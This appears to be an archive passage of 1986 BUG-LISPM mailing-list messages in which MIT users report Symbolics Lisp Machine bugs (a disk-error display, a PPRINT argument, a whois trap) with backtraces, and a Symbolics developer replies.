NETI:PARSE-RECORD-AS-TOKENS-WITH-TIMEOUT:  (P.C. = 40)
   Arg 0 (NETI:STREAM): #<CHARACTER-STREAM 40151631>
   --Defaulted args:--
   Arg 1 (NETI:COMMENTS-P): T

(:METHOD NETI:LISPM-NAMESPACE-ACCESS-PATH :QUERY):  (P.C. = 137)
   Arg 0 (SELF): #<LISPM-NAMESPACE-ACCESS-PATH Namespace Lock REAGAN 11045032>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor NETI:LISPM-NAMESPACE-ACCESS-PATH -- 3. IV's, 1. FL's 121260624>
   Arg 2 (SI:OPERATION): :QUERY
   Arg 3 (NETI:NAMESPACE): #<NAMESPACE MIT 43300364>
   Arg 4 (NETI:CLASS): :USER
   Rest arg (NETI:PROPERTY-LIST): (:NAME #<NAME MIT|NOAKES 43333504>)

(:INTERNAL (:METHOD NETI:LISPM-NAMESPACE-ACCESS-PATH :COMBINED :QUERY) 0):  (P.C. = 10)
   Arg 0 (SELF): #<LISPM-NAMESPACE-ACCESS-PATH Namespace Lock REAGAN 11045032>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor NETI:LISPM-NAMESPACE-ACCESS-PATH -- 3. IV's, 1. FL's 121260624>
   Arg 2 (SI:.OPERATION.): :QUERY
   Rest arg (SI:.DAEMON-CALLER-ARGS.): (#<NAMESPACE MIT 43300364> :USER :NAME #<NAME MIT|NOAKES 43333504>)

(:METHOD NETI:NAMESPACE-ACCESS-PATH :WHOPPER :QUERY):  (P.C. = 43)
   Arg 0 (SELF): #<LISPM-NAMESPACE-ACCESS-PATH Namespace Lock REAGAN 11045032>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor NETI:NAMESPACE-ACCESS-PATH -- 3. IV's, 0. FL's 121260633>
   Arg 2 (SI:.WHOPPER-CONTINUATION.): #<DTP-COMPILED-FUNCTION (:INTERNAL (:METHOD NETI:LISPM-NAMESPACE-ACCESS-PATH :COMBINED :QUERY) 0) 22100026>
   Arg 3 (SI:.OLD-SELF-MAPPING-TABLE.): #<Map to flavor NETI:LISPM-NAMESPACE-ACCESS-PATH -- 3. IV's, 1. FL's 121260624>
   Arg 4 (SI:.OPERATION.): :QUERY
   Arg 5 (NETI:NAMESPACE): #<NAMESPACE MIT 43300364>
   Arg 6 (NETI:CLASS): :USER
   Rest arg (NETI:PROPERTY-LIST): (:NAME #<NAME MIT|NOAKES 43333504>)

(:METHOD NETI:LISPM-NAMESPACE-ACCESS-PATH :COMBINED :QUERY):  (P.C. = 13)
   Arg 0 (SELF): #<LISPM-NAMESPACE-ACCESS-PATH Namespace Lock REAGAN 11045032>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor NETI:LISPM-NAMESPACE-ACCESS-PATH -- 3. IV's, 1. FL's 121260624>
   Arg 2 (SI:.OPERATION.): :QUERY
   Rest arg (SI:.DAEMON-CALLER-ARGS.): (#<NAMESPACE MIT 43300364> :USER :NAME #<NAME MIT|NOAKES 43333504>)

(:DEFUN-METHOD NETI:LISPM-NAMESPACE-NAMES-ONLY-QUERY-RESPONSE):  (P.C. = 126)
   Arg 0 (SELF): #<LISPM-NAMESPACE-ACCESS-PATH Namespace Lock REAGAN 11045032>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor NETI:LISPM-NAMESPACE-ACCESS-PATH -- 3. IV's, 1. FL's 121260624>
   Arg 2 (NETI:NAMESPACE): #<NAMESPACE MIT 43300364>
   Arg 3 (NETI:CLASS): :USER
   Arg 4 (NETI:RECORD): (("KWG") ("JRG") ("NZ") ("GILL") ("NCS") ("SKUBAL") ("GLR") ("LIP") ("DOC") ("PDA") ...)

(:METHOD NETI:LISPM-NAMESPACE-ACCESS-PATH :QUERY):  (P.C. = 163)
   Arg 0 (SELF): #<LISPM-NAMESPACE-ACCESS-PATH Namespace Lock REAGAN 11045032>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor NETI:LISPM-NAMESPACE-ACCESS-PATH -- 3. IV's, 1. FL's 121260624>
   Arg 2 (SI:OPERATION): :QUERY
   Arg 3 (NETI:NAMESPACE): #<NAMESPACE MIT 43300364>
   Arg 4 (NETI:CLASS): :USER
   Rest arg (NETI:PROPERTY-LIST): (:NAMES-ONLY T :TIMESTAMP NIL)

(:INTERNAL (:METHOD NETI:LISPM-NAMESPACE-ACCESS-PATH :COMBINED :QUERY) 0):  (P.C. = 10)
   Arg 0 (SELF): #<LISPM-NAMESPACE-ACCESS-PATH Namespace Lock REAGAN 11045032>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor NETI:LISPM-NAMESPACE-ACCESS-PATH -- 3. IV's, 1. FL's 121260624>
   Arg 2 (SI:.OPERATION.): :QUERY
   Rest arg (SI:.DAEMON-CALLER-ARGS.): (#<NAMESPACE MIT 43300364> :USER :NAMES-ONLY T :TIMESTAMP NIL)

(:METHOD NETI:NAMESPACE-ACCESS-PATH :WHOPPER :QUERY):  (P.C. = 43)
   Arg 0 (SELF): #<LISPM-NAMESPACE-ACCESS-PATH Namespace Lock REAGAN 11045032>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor NETI:NAMESPACE-ACCESS-PATH -- 3. IV's, 0. FL's 121260633>
   Arg 2 (SI:.WHOPPER-CONTINUATION.): #<DTP-COMPILED-FUNCTION (:INTERNAL (:METHOD NETI:LISPM-NAMESPACE-ACCESS-PATH :COMBINED :QUERY) 0) 22100026>
   Arg 3 (SI:.OLD-SELF-MAPPING-TABLE.): #<Map to flavor NETI:LISPM-NAMESPACE-ACCESS-PATH -- 3. IV's, 1. FL's 121260624>
   Arg 4 (SI:.OPERATION.): :QUERY
   Arg 5 (NETI:NAMESPACE): #<NAMESPACE MIT 43300364>
   Arg 6 (NETI:CLASS): :USER
   Rest arg (NETI:PROPERTY-LIST): (:NAMES-ONLY T :TIMESTAMP NIL)

(:METHOD NETI:LISPM-NAMESPACE-ACCESS-PATH :COMBINED :QUERY):  (P.C. = 13)
   Arg 0 (SELF): #<LISPM-NAMESPACE-ACCESS-PATH Namespace Lock REAGAN 11045032>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor NETI:LISPM-NAMESPACE-ACCESS-PATH -- 3. IV's, 1. FL's 121260624>
   Arg 2 (SI:.OPERATION.): :QUERY
   Rest arg (SI:.DAEMON-CALLER-ARGS.): (#<NAMESPACE MIT 43300364> :USER :NAMES-ONLY T :TIMESTAMP NIL)

NETI:QUERY-NAMESPACE-SERVER:  (P.C. = 65)
   Arg 0 (NETI:CLASS): :USER
   Arg 1 (NETI:NAMESPACE): #<NAMESPACE MIT 43300364>
   Rest arg (NETI:PROPERTY-LIST): (:NAMES-ONLY T :TIMESTAMP NIL)

NETI:FIND-OBJECTS-FROM-PROPERTY-LIST-IN-NAMESPACE:  (P.C. = 144)
   Arg 0 (NETI:CLASS): :USER
   Arg 1 (NETI:NAMESPACE): #<NAMESPACE MIT 43300364>
   Rest arg (NETI:PROPERTY-LIST): NIL

NETI:FINDING-OBJECTS:  (P.C. = 33)
   Arg 0 (NETI:CLASS): :USER
   Arg 1 (NETI:PROPERTY-LIST): NIL
   Arg 2 (FUNCTION): #<LEXICAL-CLOSURE (:INTERNAL NET:FIND-OBJECTS-FROM-PROPERTY-LIST 0) 36140271>
   Rest arg (NETI:OTHER-ARGS): NIL

NET:FIND-OBJECTS-FROM-PROPERTY-LIST:  (P.C. = 16)
   Arg 0 (NETI:CLASS): :USER
   Rest arg (NETI:PROPERTY-LIST): NIL

NETI:INTERPRET-USER-ARGUMENT:  (P.C. = 42)
   Arg 0 (NETI:USER): "lennon"

NETI:NAME-SERVER-INTERNAL:  (P.C. = 57)
   Arg 0 (NETI:STREAM): #<CHARACTER-STREAM 40147506>
   Arg 1 (NETI:USER): "lennon"
   Arg 2 (NET:WHOIS): NIL

NETI:NAME-SERVER-FUNCTION-INTERNAL:  (P.C. = 37)
   Arg 0 (NETI:STREAM): #<CHARACTER-STREAM 40147506>

NETI:CALL-FAST-SERVER-FUNCTION:  (P.C. = 27)
   Arg 0 (NETI:SERVER): #<SERVER NAME 144321263>
   Arg 1 (NETI:ARGUMENTS): (:STREAM #<CHARACTER-STREAM 40147506> :NETWORK #<CHAOS-NETWORK CHAOS 43301061> :ADDRESS 5660 :MEDIUM :CHAOS)

NETI:FUNCALL-SERVER-FUNCTION:  (P.C. = 53)
   Arg 0 (NETI:SERVER): #<SERVER NAME 144321263>
   Arg 1 (NETI:ARGUMENTS): (:STREAM #<CHARACTER-STREAM 40147506> :NETWORK #<CHAOS-NETWORK CHAOS 43301061> :ADDRESS 5660 :MEDIUM :CHAOS)

NETI:BYTE-STREAM-INVOKE-SERVICE-FUNCTION:  (P.C. = 50)
   Arg 0 (NETI:SERVER): #<SERVER NAME 144321263>
   Arg 1 (NETI:MEDIUM-NAME): :CHAOS
   Arg 2 (NETI:MEDIUM-ARGS): (#<CHAOS Connection for NAME to AI|AP8 145132536>)
   Arg 3 (NETI:GENERAL-ARGUMENTS): (:NETWORK #<CHAOS-NETWORK CHAOS 43301061> :ADDRESS 5660 :MEDIUM :CHAOS)

NETI:INVOKE-SERVER-INTERNAL:  (P.C. = 217)
   Arg 0 (NETI:SERVER): #<SERVER NAME 144321263>
   Arg 1 (NETI:MEDIUM-NAME): (:CHAOS :CHAOS-SIMPLE)
   Local 1 (NETI:MEDIUM-NAME): :CHAOS
   Arg 2 (NET:NETWORK): #<CHAOS-NETWORK CHAOS 43301061>
   Arg 3 (NETI:ADDRESS): 5660
   Arg 4 (NETI:STREAM-ARGS): (#<CHAOS Connection for NAME to AI|AP8 145132536>)

SI:PROCESS-RUN-FUNCTION-INTERNAL:  (P.C. = 52)
   Arg 0 (SI:RESTART-ON-RESET): NIL
   Arg 1 (FUNCTION): #<DTP-COMPILED-FUNCTION NETI:INVOKE-SERVER-INTERNAL 7074353>
   Rest arg (ARGS): (#<SERVER NAME 144321263> (:CHAOS :CHAOS-SIMPLE) #<CHAOS-NETWORK CHAOS 43301061> 5660 (#<CHAOS Connection for NAME to AI|AP8 145132536>))

SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
   Arg 0 (IGNORE): NIL
18-May-86 18:54:02-EDT,1946;000000000000
Received: from EDDIE.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 18 May 86 18:53-EDT
Received: by EDDIE (5.31/4.7) id AA15435; Sun, 18 May 86 18:52:07 EDT
Received: by MEDIA-LAB.MIT.EDU (5.31/4.8)  id AA04715; Sun, 18 May 86 18:53:03 EDT
Date: Sun, 18 May 86 18:51 EDT
From: James R. Davis <jrd@MEDIA-LAB.MIT.EDU>
Subject: Disk Error
To: BUG-LISPM@MEDIA-LAB.MIT.EDU
Message-Id: <860518185103.1.JRD@XEVIOUS.ARPA>

In Symbolics 3600 Release 6.1, Netrender (DS) 1.12, COLOR 135.55,
COLOR-DEMO 68.10, Paint (DS) 8.0, Menu 6.1,
Experimental Color Editor 5.1, IMAGES 56.25, COLOR-EXTENSIONS 4.6,
BS-FONTS 4.2, Tablet (DS) 3.7, Live Window 272.0, Dynamics (DS) 7.15,
Render (DS) 15.6, COLOR-PALETTE 2.1, Geometry (DS) 7.40, Demo-Band 63.0,
Experimental TMC 3d Image Toolkit 71.0, IP-TCP 29.13, DECTALK 1.3,
Experimental PROSE 1.0, Japanese 24.1, Versatec 9.0, Spire 17.2,
Experimental SYLPAR 1.0, DICTIONARY 1.3, Experimental SPELL 1.3,
microcode TMC5-COLOR-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(3), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), Bug Report Recipient, on Xevious:

The other day I got into the FEP unexpectedly with the message

Lisp stopped itself
"Proceedable disk error at unit ~O cylinder ~O head ~O sector ~O" 0(8)
360(8) 2(8) 20(8) "Irrecoverable disk [illegible]"

(It is my handwritten notes that are illegible, not the message.  It
might have been "overrun")

1) This message is clearly a bug.  It looks to me like the arguments to
FORMAT, instead of the result of format.  Note also that the final arg,
the string, has no associated format string in the format-string arg.

I typed START to the FEP and everything seemed fine.  

2) It would be nice if the message would have included some advice
to the effect that typing Start was okay and would probably work,
unless there was some even less drastic thing I could have done that
would also have worked.

19-May-86 22:36:24-EDT,908;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 19 May 86 22:36-EDT
Received: from LAPLACE.AI.MIT.EDU by REAGAN.AI.MIT.EDU via CHAOS with CHAOS-MAIL id 32701; Mon 19-May-86 22:36:24-EDT
Date: Mon, 19 May 86 22:35 EDT
From: Steve Gander <GANDER@OZ.AI.MIT.EDU>
Subject: bug in (interval-with-fonts-stream :string-out)
To: bug-lispm@OZ.AI.MIT.EDU
Message-ID: <860519223515.9.GANDER@LAPLACE.AI.MIT.EDU>

there is a bug in zwei:(interval-with-fonts-stream :string-out)
currently the method takes only one argument, STRING, it should take 3 argunemts
STRING, START, END, 
format uses these extra arguments sometimes and generates an error. this is what the correct code
should look like:

(defmethod (interval-with-fonts-stream :string-out) (string &optional (start 0) end)
    (loop for i from start below (or end (string-length string))
	  do (send self ':tyo (aref string i))))
20-May-86 17:00:04-EDT,3236;000000000000
Received: from EDDIE.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 20 May 86 16:59-EDT
Received: by EDDIE (5.31/4.7) id AA14807; Tue, 20 May 86 16:55:57 EDT
Received: by MEDIA-LAB.MIT.EDU (5.31/4.8)  id AA07203; Tue, 20 May 86 16:57:24 EDT
Received: from SAPSUCKER.SCRC.Symbolics.COM by MC.LCS.MIT.EDU 20 May 86 16:41:04 EDT
Received: from FIREBIRD.SCRC.Symbolics.COM by SAPSUCKER.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 21466; Mon 19-May-86 10:02:17 EDT
Date: Mon, 19 May 86 10:06 EDT
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
Subject: Disk Error
To: James R. Davis <jrd%MEDIA-LAB.MIT.EDU@MIT-MC.ARPA>,
        BUG-LISPM%MEDIA-LAB.MIT.EDU@MIT-MC.ARPA
In-Reply-To: <860518185103.1.JRD@XEVIOUS.ARPA>
Message-Id: <860519100630.7.DCP@FIREBIRD.SCRC.Symbolics.COM>

    Date: Sun, 18 May 86 18:51 EDT
    From: James R. Davis <jrd@MEDIA-LAB.MIT.EDU>

    In Symbolics 3600 Release 6.1, Netrender (DS) 1.12, COLOR 135.55,
    COLOR-DEMO 68.10, Paint (DS) 8.0, Menu 6.1,
    Experimental Color Editor 5.1, IMAGES 56.25, COLOR-EXTENSIONS 4.6,
    BS-FONTS 4.2, Tablet (DS) 3.7, Live Window 272.0, Dynamics (DS) 7.15,
    Render (DS) 15.6, COLOR-PALETTE 2.1, Geometry (DS) 7.40, Demo-Band 63.0,
    Experimental TMC 3d Image Toolkit 71.0, IP-TCP 29.13, DECTALK 1.3,
    Experimental PROSE 1.0, Japanese 24.1, Versatec 9.0, Spire 17.2,
    Experimental SYLPAR 1.0, DICTIONARY 1.3, Experimental SPELL 1.3,
    microcode TMC5-COLOR-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
    FEP0:>v127-loaders.flod(3), FEP0:>v127-debug.flod(1),
    FEP0:>v127-info.flod(2), Bug Report Recipient, on Xevious:

    The other day I got into the FEP unexpectedly with the message

    Lisp stopped itself
    "Proceedable disk error at unit ~O cylinder ~O head ~O sector ~O" 0(8)
    360(8) 2(8) 20(8) "Irrecoverable disk [illegible]"

    (It is my handwritten notes that are illegible, not the message.  It
    might have been "overrun")

    1) This message is clearly a bug.  It looks to me like the arguments to
    FORMAT, instead of the result of format.  Note also that the final arg,
    the string, has no associated format string in the format-string arg.

If Lisp weren't in the paging system and could therefor call format, it
would have called format.  As it is, it was deep in the guts of the
paging/disk system and the page faults required to try to run format
(let alone the consing it would have tried to do (on the aux stack,
which is illegal)) probably wouldn't have helped matters.  The best it
can do is halt.  Instead of halting and telling you nothing, it puts the
format string and args in a place the FEP can find them.  The FEP simply
prints them out in a simple-minded way; it does not try to interpret
Lisp's format directives.  "So many feature requests, so few
programmers..."

    I typed START to the FEP and everything seemed fine.  

    2) It would be nice if the message would have included some advice
    to the effect that typing Start was okay and would probably work,
    unless there was some even less drastic thing I could have done that
    would also have worked.

The FEP doesn't know.  I don't even think Lisp knows so it could inform
the FEP.


23-May-86 00:09:30-EDT,515;000000000000
Received: from DEEP-THOUGHT.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 23 May 86 00:09-EDT
Date: Fri 23 May 86 00:07:45-EDT
From: Larry Kolodney <G.LKK@DEEP-THOUGHT.MIT.EDU>
Subject: hurewicz lossage
To: bug-lispm@DEEP-THOUGHT.MIT.EDU
cc: g.lkk@DEEP-THOUGHT.MIT.EDU
Message-ID: <12208877612.8.G.LKK@DEEP-THOUGHT.MIT.EDU>


Lisp machine hurewicz.ai.mit.edu crashed at approximately midnite
(i.e. 5 minutes prior to this message).

I tried rebooting it, but the FEP was unable to access the disk.

-------
23-May-86 13:49:35-EDT,928;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 23 May 86 13:49-EDT
Date: Fri, 23 May 86 13:45 EDT
From: gumby@REAGAN.AI.MIT.EDU
Sender: File-Server@REAGAN.AI.MIT.EDU
Subject: dis:load-distribution-tape asks question with "P"
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860523134513.1.FILE-SERVER@REAGAN.AI.MIT.EDU>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.15,
AISite 14.9, Mailer 43.6, microcode TMC5-COL-MIC 353, FEP 127,
FEP0:>v127-lisp.flod(5), FEP0:>v127-loaders.flod(5),
FEP0:>v127-debug.flod(10), FEP0:>v127-info.flod(5),
Network-Security patch, Update-Internet-Namespace patch,
Server-Finger patch, Inquir-update patch, Rodent Free Namespace Editor, on Lisp Machine Ronald Reagan:

Foo!  When DIS:LOAD-DISTRIBUTION-TAPE asks whether it should use a
different logical host or not it offers "P" to mean "Punt", which is
exactly opposite to its usual meaning of "Proceed."
24-May-86 20:04:54-EDT,764;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 24 May 86 20:04-EDT
Received: from LAPLACE.AI.MIT.EDU by REAGAN.AI.MIT.EDU via CHAOS with CHAOS-MAIL id 33345; Sat 24-May-86 20:04:44-EDT
Date: Sat, 24 May 86 20:03 EDT
From:  <tim@REAGAN.AI.MIT.EDU>
Reply-To: Tim@AI.AI.MIT.EDU
Subject: Defstruct :print 
To: Alan@AI.AI.MIT.EDU, bug-lispm@REAGAN.AI.MIT.EDU
Message-ID: <"860524200335.2.tim@REAGAN"@LAPLACE.AI.MIT.EDU>

The omission of the :PRINT option to DEFSTRUCT does not assure that
there is no obsolete ":PRINT-SELF method" still lying around.  Perhaps
it should.  I first noticed this in the Symbolics system, but examining
the "master" sources would lead me to believe that this behavior is
common to all its "siblings" as well.
24-May-86 21:41:14-EDT,807;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 24 May 86 21:41-EDT
Received: from DESCARTES.AI.MIT.EDU by REAGAN.AI.MIT.EDU via CHAOS with CHAOS-MAIL id 33354; Sat 24-May-86 21:41:07-EDT
Date: Sat, 24 May 86 21:39 EDT
From: Ramin Zabih <RDZ@AI.AI.MIT.EDU>
Subject: Rel 6 PPRINT 
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860524213944.1.RDZ@DESCARTES.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.15,
AISite 14.10, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>V127-LISP.FLOD(5),
FEP0:>V127-LOADERS.FLOD(5), FEP0:>v127-debug.flod(10),
FEP0:>V127-INFO.FLOD(2), on Lisp Machine Rene Descartes:

PPRINT is supposed to take an optional second argument of output stream.
Instead it ignores its second argument.
24-May-86 21:53:29-EDT,739;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 24 May 86 21:53-EDT
Received: from DESCARTES.AI.MIT.EDU by REAGAN.AI.MIT.EDU via CHAOS with CHAOS-MAIL id 33360; Sat 24-May-86 21:53:31-EDT
Date: Sat, 24 May 86 21:52 EDT
From: Ramin Zabih <RDZ@AI.AI.MIT.EDU>
Subject: Last message
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860524215215.3.RDZ@DESCARTES.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.15,
AISite 14.10, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>V127-LISP.FLOD(5),
FEP0:>V127-LOADERS.FLOD(5), FEP0:>v127-debug.flod(10),
FEP0:>V127-INFO.FLOD(2), on Lisp Machine Rene Descartes:

That last bug report was bogus.  My apologies.
27-May-86 14:28:25-EDT,1217;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 27 May 86 14:26-EDT
Received: from SAPSUCKER.SCRC.Symbolics.COM by MC.LCS.MIT.EDU 27 May 86 14:25:45 EDT
Received: from FIREBIRD.SCRC.Symbolics.COM by SAPSUCKER.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 23609; Tue 27-May-86 14:21:02 EDT
Date: Tue, 27 May 86 14:24 EDT
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
Subject: Rel 6 PPRINT 
To: Ramin Zabih <RDZ@MIT-AI.ARPA>, BUG-LISPM%OZ@MIT-MC.ARPA
In-Reply-To: <860524213944.1.RDZ@DESCARTES.AI.MIT.EDU>
Message-ID: <860527142455.2.DCP@FIREBIRD.SCRC.Symbolics.COM>

    Date: Sat, 24 May 86 21:39 EDT
    From: Ramin Zabih <RDZ@AI.AI.MIT.EDU>

    In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.15,
    AISite 14.10, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
    microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>V127-LISP.FLOD(5),
    FEP0:>V127-LOADERS.FLOD(5), FEP0:>v127-debug.flod(10),
    FEP0:>V127-INFO.FLOD(2), on Lisp Machine Rene Descartes:

    PPRINT is supposed to take an optional second argument of output stream.
    Instead it ignores its second argument.

In Release 7 (pprint 'foo #'si:null-stream) doesn't printing anything on
standard output.

28-May-86 07:46:42-EDT,2772;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 28 May 86 07:46-EDT
Received: from RIEMANN.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 33824; Wed 28-May-86 07:46:04-EDT
Date: Wed, 28 May 86 07:45 EDT
From: Richard H. Lathrop <RICKL@OZ.AI.MIT.EDU>
Subject: from :whois russell@sumex
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860528074554.1.RICKL@RIEMANN.AI.MIT.EDU>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.15,
AISite 15.0, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0, Japanese 24.2,
microcode TMC5-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(5),
FEP0:>v127-loaders.flod(5), FEP0:>v127-info.flod(5),
FEP0:>v127-debug.flod(1), on Lisp Machine Georg Friedrich Bernhard Riemann:



>>Trap: The function SI:%MAKE-HEAP-ENVIRONMENT is undefined.
While in the function HACKS:WHOIS-DOIT  HACKS:WHOIS-2  HACKS:WHOIS

HACKS:WHOIS-DOIT:  (P.C. = 3)  (from SYS: AISITE; NETWORK)
   Arg 0: "russell"
   Arg 1: #<TOPS20-HOST SUMEX-AIM 43315433>
   Arg 2 (NETI:MUGSHOT-SPEC): "russell"

HACKS:WHOIS-2:  (P.C. = 27)  (from SYS: AISITE; NETWORK)
   Arg 0 (NETI:USER-NAME): "russell"
   Arg 1 (NET:HOST): #<TOPS20-HOST SUMEX-AIM 43315433>

HACKS:WHOIS:  (P.C. = 41)  (from SYS: AISITE; NETWORK)
   Arg 0 (NETI:USER-NAME): "russell"
   Arg 1 (NET:HOST): #<TOPS20-HOST SUMEX-AIM 43315433>

(:PROPERTY NETI:COM-WHOIS SI:CP-FUNCTION):  (P.C. = 53)  (from SYS: AISITE; NETWORK)
   Arg 0 (NETI:USER): "russell@sumex"
   Arg 1 (NET:HOST): #<TOPS20-HOST SUMEX-AIM 43315433>

NETI:COM-WHOIS:  (P.C. = 11)  (from SYS: AISITE; NETWORK)
   Arg 0 (NETI:USER): "russell@sumex"
   Arg 1 (NET:HOST): #<TOPS20-HOST SUMEX-AIM 43315433>

SI:*EVAL:  (P.C. = 401)
   Arg 0 (SI:FORM): (NETI:COM-WHOIS "russell@sumex" #<TOPS20-HOST SUMEX-AIM 43315433>)
   Local 0 (SI:FORM): NIL
   --Defaulted args:--
   Arg 1 (SI:ENV): NIL
   Arg 2 (SI:HOOK): NIL

(:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0):  (P.C. = 152)
   Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): #<DTP-LOCATIVE 500047>

TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
   Arg 0 (TV:NEW-MODE): :BLAST
   Arg 1 (TV:STREAM): #:TERMINAL-IO-SYN-STREAM
   Arg 2 (TV:CONTINUATION): #<LEXICAL-CLOSURE (:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0) 500054>

SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
   Arg 0 (SI:NAME): "Lisp Top Level"
   Arg 1 (SI:ABORT-FUNCTION): NIL
   Arg 2 (SI:READ-FUNCTION): NIL
   Arg 3 (SI:EVAL-FUNCTION): NIL
   Arg 4 (SI:PRINT-FUNCTION): NIL

SI:LISP-COMMAND-LOOP:  (P.C. = 67)
   Arg 0: #<LISP-LISTENER Lisp Listener 1 43200064 exposed>
   Rest arg: (:NAME "Lisp Top Level")

SI:LISP-TOP-LEVEL1:  (P.C. = 5)
   Arg 0 (SI:STREAM): #<LISP-LISTENER Lisp Listener 1 43200064 exposed>

SI:LISP-TOP-LEVEL:  (P.C. = 7)
28-May-86 09:10:41-EDT,3389;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 28 May 86 09:10-EDT
Received: from SAPSUCKER.SCRC.Symbolics.COM ([192.10.41.223]) by MIT-REAGAN.ARPA via INTERNET with SMTP id 33831; 28 May 86 09:09:55-EDT
Received: from FIREBIRD.SCRC.Symbolics.COM by SAPSUCKER.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 23874; Wed 28-May-86 09:02:59 EDT
Date: Wed, 28 May 86 09:06 EDT
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
Subject: from :whois russell@sumex
To: Richard H. Lathrop <RICKL@OZ.AI.MIT.EDU>, BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <860528074554.1.RICKL@RIEMANN.AI.MIT.EDU>
Message-ID: <860528090642.8.DCP@FIREBIRD.SCRC.Symbolics.COM>

    Date: Wed, 28 May 86 07:45 EDT
    From: Richard H. Lathrop <RICKL@OZ.AI.MIT.EDU>

    In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.15,
    AISite 15.0, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0, Japanese 24.2,
    microcode TMC5-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(5),
    FEP0:>v127-loaders.flod(5), FEP0:>v127-info.flod(5),
    FEP0:>v127-debug.flod(1), on Lisp Machine Georg Friedrich Bernhard Riemann:

Somebody compiled SYS:AISITE;NETWORK with my MultiLisp simulator loaded.

    >>Trap: The function SI:%MAKE-HEAP-ENVIRONMENT is undefined.
    While in the function HACKS:WHOIS-DOIT  HACKS:WHOIS-2  HACKS:WHOIS

    HACKS:WHOIS-DOIT:  (P.C. = 3)  (from SYS: AISITE; NETWORK)
       Arg 0: "russell"
       Arg 1: #<TOPS20-HOST SUMEX-AIM 43315433>
       Arg 2 (NETI:MUGSHOT-SPEC): "russell"

    HACKS:WHOIS-2:  (P.C. = 27)  (from SYS: AISITE; NETWORK)
       Arg 0 (NETI:USER-NAME): "russell"
       Arg 1 (NET:HOST): #<TOPS20-HOST SUMEX-AIM 43315433>

    HACKS:WHOIS:  (P.C. = 41)  (from SYS: AISITE; NETWORK)
       Arg 0 (NETI:USER-NAME): "russell"
       Arg 1 (NET:HOST): #<TOPS20-HOST SUMEX-AIM 43315433>

    (:PROPERTY NETI:COM-WHOIS SI:CP-FUNCTION):  (P.C. = 53)  (from SYS: AISITE; NETWORK)
       Arg 0 (NETI:USER): "russell@sumex"
       Arg 1 (NET:HOST): #<TOPS20-HOST SUMEX-AIM 43315433>

    NETI:COM-WHOIS:  (P.C. = 11)  (from SYS: AISITE; NETWORK)
       Arg 0 (NETI:USER): "russell@sumex"
       Arg 1 (NET:HOST): #<TOPS20-HOST SUMEX-AIM 43315433>

    SI:*EVAL:  (P.C. = 401)
       Arg 0 (SI:FORM): (NETI:COM-WHOIS "russell@sumex" #<TOPS20-HOST SUMEX-AIM 43315433>)
       Local 0 (SI:FORM): NIL
       --Defaulted args:--
       Arg 1 (SI:ENV): NIL
       Arg 2 (SI:HOOK): NIL

